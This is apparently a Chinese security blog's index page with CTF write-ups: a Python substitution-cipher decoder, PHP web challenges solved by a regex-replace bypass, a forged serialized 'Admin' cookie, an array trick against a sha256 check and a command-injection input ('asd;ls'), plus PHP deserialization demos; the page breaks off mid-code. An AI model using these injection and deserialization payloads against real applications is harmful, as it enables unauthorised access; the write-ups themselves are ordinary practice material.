<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
  <script src="/lib/pace/pace.min.js"></script>

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="为什么不拉弟弟一把呢">
<meta property="og:type" content="website">
<meta property="og:title" content="灵能对抗实验室">
<meta property="og:url" content="http://example.com/index.html">
<meta property="og:site_name" content="灵能对抗实验室">
<meta property="og:description" content="为什么不拉弟弟一把呢">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="hanbaiGG">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>灵能对抗实验室</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">灵能对抗实验室</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-resources">

    <a href="/resources/" rel="section"><i class="fa fa-download fa-fw"></i>资源</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/11/4-13/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/11/4-13/" class="post-title-link" itemprop="url">4-13</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-04-11 19:51:47 / 修改时间：19:53:33" itemprop="dateCreated datePublished" datetime="2022-04-11T19:51:47+08:00">2022-04-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="靶场练习"><a href="#靶场练习" class="headerlink" title="靶场练习"></a>靶场练习</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="卷网杯easyphp"><a href="#卷网杯easyphp" class="headerlink" title="卷网杯easyphp"></a>卷网杯easyphp</h3>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/31/4-7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="hanbaiGG">
      <meta itemprop="description" content="为什么不拉弟弟一把呢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="灵能对抗实验室">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/03/31/4-7/" class="post-title-link" itemprop="url">4-7</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-03-31 10:40:01" itemprop="dateCreated datePublished" datetime="2022-03-31T10:40:01+08:00">2022-03-31</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-04-06 18:27:10" itemprop="dateModified" datetime="2022-04-06T18:27:10+08:00">2022-04-06</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="字符替换解码"><a href="#字符替换解码" class="headerlink" title="字符替换解码"></a>字符替换解码</h2><p>下载flag.txt<br>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">EKSZJTCMXOQUDYLFABGPHNRVIW </span><br><span class="line"></span><br><span class="line">Mjbjhfly Ujcbeyz eblgj, rxpm e cbenj eyz gpepjui exb, eyz kblhcmp dj pmj kjjpuj</span><br><span class="line">tbld e cuegg segj xy rmxsm xp reg jysulgjz. Xp reg e kjehpxthu gsebekejhg, eyz, ep</span><br><span class="line">pmep pxdj, hyqylry pl yephbeuxgpg—lt slhbgj e cbjep fbxwj xy e gsxjypxtxs flxyp</span><br><span class="line">lt nxjr. Pmjbj rjbj prl blhyz kuesq gflpg yjeb lyj jvpbjdxpi lt pmj kesq, eyz e</span><br><span class="line">ulyc lyj yjeb pmj lpmjb. Pmj gseujg rjbj jvsjjzxycui mebz eyz culggi, rxpm euu pmj</span><br><span class="line">effjebeysj lt khbyxgmjz cluz. Pmj rjxcmp lt pmj xygjsp reg njbi bjdebqekuj, eyz,</span><br><span class="line">peqxyc euu pmxycg xypl slygxzjbepxly, X slhuz mebzui kuedj Ohfxpjb tlb mxg lfxyxly</span><br><span class="line">bjgfjspxyc xp.</span><br><span class="line"></span><br><span class="line">Pmj tuec xg: fxslSPT&#123;5HK5717H710Y_3N0UH710Y_59533E2J&#125;</span><br></pre></td></tr></table></figure>
<p>根据密钥key对文件解码得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">key=&#x27;EKSZJTCMXOQUDYLFABGPHNRVIW&#x27;</span><br><span class="line"></span><br><span class="line">aim=&#x27;Mjbjhfly Ujcbeyz eblgj, rxpm e cbenj eyz gpepjui exb, eyz kblhcmp dj pmj kjjpuj tbld e cuegg segj xy rmxsm xp reg jysulgjz. Xp reg e kjehpxthu gsebekejhg, eyz, ep pmep pxdj, hyqylry pl yephbeuxgpg—lt slhbgj e cbjep fbxwj xy e gsxjypxtxs flxyp lt nxjr. Pmjbj rjbj prl blhyz kuesq gflpg yjeb lyj jvpbjdxpi lt pmj kesq, eyz e ulyc lyj yjeb pmj lpmjb. Pmj gseujg rjbj jvsjjzxycui mebz eyz culggi, rxpm euu pmj effjebeysj lt khbyxgmjz cluz. Pmj rjxcmp lt pmj xygjsp reg njbi bjdebqekuj, eyz, peqxyc euu pmxycg xypl slygxzjbepxly, X slhuz mebzui kuedj Ohfxpjb tlb mxg lfxyxlybjgfjspxyc xp.&#x27;</span><br><span class="line">flag=&#x27;&#123;5HK5717H710Y_3N0UH710Y_59533E2J&#125;&#x27;</span><br><span class="line"></span><br><span class="line">for i in aim:</span><br><span class="line">    cnt=96</span><br><span class="line">    if(ord(i)&lt;64 or ord(i)&gt;133):</span><br><span class="line">        print(i,end=&quot;&quot;)</span><br><span class="line">    if(i==&quot;_&quot;):</span><br><span class="line">        print(i,end=&quot;&quot;)</span><br><span class="line">    for k in key:</span><br><span class="line">        cnt+=1</span><br><span class="line">        if(i==k or i==chr(ord(k)+97-65)):</span><br><span class="line">            print(chr(cnt),end=&quot;&quot;)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="RITSECctf"><a href="#RITSECctf" class="headerlink" title="RITSECctf"></a>RITSECctf</h2><h3 id="web"><a href="#web" class="headerlink" title="web"></a>web</h3><h4 id="Pretty-Horrible-Program1"><a href="#Pretty-Horrible-Program1" class="headerlink" title="Pretty Horrible Program1"></a>Pretty Horrible Program1</h4><p>查看题目提供的源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;bingus&#x27;])) &#123;</span><br><span class="line">  $input = $_GET[&#x27;bingus&#x27;];</span><br><span class="line">  $to_replace = &#x27;bingus&#x27;;</span><br><span class="line">  $clean_string = preg_replace(&quot;/$to_replace/&quot;, &#x27;&#x27;, $input);</span><br><span class="line">  echo &quot;&lt;p&gt;Your string is: $clean_string&lt;/p&gt;&quot;;</span><br><span class="line">  if ($clean_string == $to_replace) &#123;</span><br><span class="line">    echo &quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: green;\&quot;&gt;IS&lt;/span&gt; your beloved&lt;/h2&gt;&quot;;</span><br><span class="line">    output_flag();</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &quot;&lt;h2 class=\&quot;answer\&quot;&gt;Bingus &lt;span style=\&quot;color: red;\&quot;&gt;IS NOT&lt;/span&gt; your beloved&lt;/h2&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>输入<code>bingus</code>，替换字符中的关键字为空，但只有单此替换，使用重复字节绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bingbingusus</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h4 id="Pretty-Horrible-Program2"><a href="#Pretty-Horrible-Program2" class="headerlink" title="Pretty Horrible Program2"></a>Pretty Horrible Program2</h4><p>查看提供源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">  public $role = &#x27;User&#x27;;</span><br><span class="line"></span><br><span class="line">  public function is_admin()</span><br><span class="line">  &#123;</span><br><span class="line">    if ($this-&gt;role == &#x27;Admin&#x27;) &#123;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function __sleep()</span><br><span class="line">  &#123;</span><br><span class="line">    return array($this-&gt;role);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_COOKIE[&#x27;user&#x27;])) &#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Output:&lt;br/&gt;&quot; . $_COOKIE[&#x27;user&#x27;] . &#x27;&lt;/p&gt;&#x27;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo &#x27;Please provide some input.&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_COOKIE[&#x27;user&#x27;])) &#123;</span><br><span class="line">  try &#123;</span><br><span class="line">    $user = unserialize($_COOKIE[&#x27;user&#x27;]);</span><br><span class="line">    if ($user-&gt;is_admin()) &#123;</span><br><span class="line">      echo &#x27;&lt;h3 class=&quot;success&quot;&gt;Welcome Admin&lt;/h3&gt;&#x27;;</span><br><span class="line">      output_flag();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &#x27;&lt;h3 class=&quot;error&quot;&gt;Not Admin&lt;/h3&gt;&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; catch (Error $e) &#123;</span><br><span class="line">    echo &#x27;&lt;h2 class=&quot;error&quot;&gt;Uh oh, ur input was &lt;code&gt;cringe&lt;/code&gt;&lt;/h2&gt;&#x27;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>PHP反序列化漏洞<em>不知道为什么直接生成的脚本没有变量名</em><br>构造payload<br><code> O:4:&quot;User&quot;:1:&#123;s:4:&quot;role&quot;;s:5:&quot;Admin&quot;;&#125;</code><br>得到flag。RS{C3re4l_B1ngu5}</p>
<h4 id="Pretty-Horrible-Program3"><a href="#Pretty-Horrible-Program3" class="headerlink" title="Pretty Horrible Program3"></a>Pretty Horrible Program3</h4><p>查看提供的源码<br>sha256绕过，<br>使用数组绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php3?input1[]=1&amp;input2[]=2</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h4 id="Really-Cool-Encryption"><a href="#Really-Cool-Encryption" class="headerlink" title="Really Cool Encryption"></a>Really Cool Encryption</h4><p>input存在任意命令执行漏洞<br><code>input=asd;ls</code>查看目录，得到base64加密的回显<br>尝试catflag，失败<br>发现存在<code>dockerfile</code><br>cat dockerfile，恢复image</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -it -p80:80 youngbaofeng/google-image-search-pertext</span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>
<h2 id="Space-Heroes-CTF-2022"><a href="#Space-Heroes-CTF-2022" class="headerlink" title="Space Heroes CTF 2022"></a>Space Heroes CTF 2022</h2><h3 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h3><h4 id="R2D2"><a href="#R2D2" class="headerlink" title="R2D2"></a>R2D2</h4><p>打开网址<br>一张星球大战两个机器人的照片，<br>盲猜和<code>robots.txt</code>有关<br>打开后直接获得flag。</p>
<h4 id="Space-traveler"><a href="#Space-traveler" class="headerlink" title="Space traveler"></a>Space traveler</h4><p>打开网页，提示查看js脚本<br>获得源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var _0xb645 = [&quot;\x47\x75\x65\x73\x73\x20\x54\x68\x65\x20\x46\x6C\x61\x67&quot;, &quot;\x73\x68\x63\x74\x66\x7B\x66\x6C\x61\x67\x7D&quot;, &quot;\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x72\x69\x67\x68\x74\x2E&quot;, &quot;\x73\x68\x63\x74\x66\x7B\x65\x69\x67\x68\x74\x79\x5F\x73\x65\x76\x65\x6E\x5F\x74\x68\x6F\x75\x73\x61\x6E\x64\x5F\x6D\x69\x6C\x6C\x69\x6F\x6E\x5F\x73\x75\x6E\x73\x7D&quot;, &quot;\x59\x6F\x75\x20\x67\x75\x65\x73\x73\x65\x64\x20\x77\x72\x6F\x6E\x67\x2E&quot;, &quot;\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C&quot;, &quot;\x64\x65\x6D\x6F&quot;, &quot;\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64&quot;];</span><br><span class="line"></span><br><span class="line">function myFunction() &#123;</span><br><span class="line">    let _0xb729x2;</span><br><span class="line">    let _0xb729x3 = prompt(_0xb645[0], _0xb645[1]);</span><br><span class="line">    switch (_0xb729x3) &#123;</span><br><span class="line">        case _0xb645[3]:</span><br><span class="line">            _0xb729x2 = _0xb645[2];</span><br><span class="line">            break;</span><br><span class="line">        default:</span><br><span class="line">            _0xb729x2 = _0xb645[4]</span><br><span class="line">    &#125;;</span><br><span class="line">    document[_0xb645[7]](_0xb645[6])[_0xb645[5]] = _0xb729x2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>js前端代码混淆，应该是ob混淆<br>尝试复原<br>在线解码网页<br><code>https://deobfuscate.io/</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function myFunction() &#123;</span><br><span class="line">  let azante;</span><br><span class="line">  let karynna = prompt(&quot;Guess The Flag&quot;, &quot;shctf&#123;flag&#125;&quot;);</span><br><span class="line">  switch (karynna) &#123;</span><br><span class="line">    case &quot;shctf&#123;eighty_seven_thousand_million_suns&#125;&quot;:</span><br><span class="line">      azante = &quot;You guessed right.&quot;;</span><br><span class="line">      break;</span><br><span class="line">    default:</span><br><span class="line">      azante = &quot;You guessed wrong.&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  ;</span><br><span class="line">  document.getElementById(&quot;demo&quot;).innerHTML = azante;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h2 id="反序列化demo"><a href="#反序列化demo" class="headerlink" title="反序列化demo"></a>反序列化demo</h2><h3 id="demo1"><a href="#demo1" class="headerlink" title="demo1"></a>demo1</h3><p>源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  error_reporting(<span class="number">0</span>); <span class="comment">//关闭错误报告</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">happy</span></span>&#123; </span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$file</span>=<span class="string">&#x27;demo1.php&#x27;</span>; </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;file=<span class="variable">$file</span>; </span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; <span class="comment">//该函数会在类的一个对象被删除时自动调用</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(strchr(<span class="keyword">$this</span>-&gt;file,<span class="string">&quot;\\&quot;</span>)===<span class="literal">false</span> &amp;&amp; strchr(<span class="keyword">$this</span>-&gt;file,<span class="string">&#x27;/&#x27;</span>)===<span class="literal">false</span>) <span class="comment">//过滤了文件名中的\\与/</span></span><br><span class="line">                    show_source(dirname(<span class="keyword">__FILE__</span>).<span class="string">&#x27;/&#x27;</span>.<span class="keyword">$this</span>-&gt;file); <span class="comment">//打开文件操作</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Wrong filename.&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">         </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;file=<span class="string">&#x27;demo1.php&#x27;</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> &#125;</span><br><span class="line">      </span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123; </span><br><span class="line">        show_source(<span class="string">&#x27;demo1.php&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="variable">$file</span>=base64_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line">        <span class="keyword">echo</span> unserialize(<span class="variable">$file</span>); </span><br><span class="line">        &#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">&lt;!--password in flag.php--&gt; </span><br></pre></td></tr></table></figure>
<p>wakeup魔术方法绕过<br>通过更改序列化后的数字标识绕过<br>获得flag</p>
<h3 id="DEMO2"><a href="#DEMO2" class="headerlink" title="DEMO2"></a>DEMO2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="string">&#x27;demo2.php&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr = <span class="string">&quot;demo2.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;varr))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;文件&quot;</span>.<span class="keyword">$this</span>-&gt;varr.<span class="string">&quot;存在&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$varr</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;varr=<span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj=<span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;obj-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;varr;</span><br><span 